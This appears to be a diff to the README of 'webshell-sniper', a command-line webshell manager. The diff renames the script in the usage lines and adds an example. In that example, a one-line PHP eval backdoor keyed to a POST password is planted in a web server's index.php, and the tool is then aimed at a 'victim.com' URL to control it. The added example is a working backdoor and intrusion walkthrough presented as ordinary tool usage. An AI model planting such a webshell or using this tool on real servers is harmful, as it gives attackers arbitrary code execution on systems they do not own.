@@ -4,11 +4,17 @@ A webshell manager via terminal
 #### Usage :
 ```
 Usage : 
-        python sniper.py [URL] [METHOD] [AUTH]
+        python webshell-sniper.py [URL] [METHOD] [AUTH]
 Example : 
-        python sniper.py http://127.0.0.1/c.php POST c
+        python webshell-sniper.py http://127.0.0.1/c.php POST c
 Author : 
         WangYihang <wangyihanger@gmail.com>
+```
+```
+# cat /var/www/html/index.php
+<?php eval($_POST['s3cr3t']);?>
+# python webshell-sniper.py http://victim.com/index.php POST s3cr3t
+...
 ```
 
 #### Installation:
